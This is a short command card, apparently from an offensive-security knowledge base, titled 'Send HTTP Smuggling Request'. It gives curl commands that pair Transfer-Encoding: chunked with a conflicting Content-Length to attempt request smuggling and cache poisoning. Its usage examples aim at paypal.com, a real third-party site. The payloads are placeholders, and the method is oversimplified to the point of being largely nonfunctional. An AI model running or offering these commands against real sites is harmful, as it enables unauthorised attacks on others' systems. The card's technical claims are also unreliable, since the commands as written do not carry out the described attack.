---
data: >-
  curl -X POST https://target.com/endpoint --data "smuggled_request_payload" -H
  "Transfer-Encoding: chunked" -H "Content-Length: manipulated_length"
tags:
  - http-request-smuggling
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 496b7c43-d2a3-46b8-a1a2-e251245b9519
created_at: '2025-12-14T00:11:25.453Z'
updated_at: '2025-12-14T00:11:25.453Z'
verified: false
validated: true
submitted: true
---
# Send HTTP Smuggling Request

## Command

```bash
curl -X POST https://target.com/endpoint --data "smuggled_request_payload" -H "Transfer-Encoding: chunked" -H "Content-Length: manipulated_length"
```

## Description

This command sends a crafted HTTP request to exploit smuggling vulnerabilities by mismatching Content-Length and Transfer-Encoding, allowing payload injection into caches.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `--data "smuggled_request_payload"` | The smuggled payload | Yes |
| `-H "Transfer-Encoding: chunked"` | Enables chunked encoding | Yes |
| `-H "Content-Length: manipulated_length"` | Sets conflicting length | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://paypal.com/endpoint --data "smuggled_request_payload" -H "Transfer-Encoding: chunked" -H "Content-Length: 0"
```

### Advanced Usage

```bash
curl -X POST https://paypal.com/endpoint --data "CLTE smuggling payload" -H "Transfer-Encoding: chunked" -H "Content-Length: 100" -v
```

## Expected Output

HTTP response indicating successful request processing, potentially with verbose output showing smuggling effects.

## Related

- [[procedures/Exploit-HTTP-Request-Smuggling-for-Cache-Poisoning]]
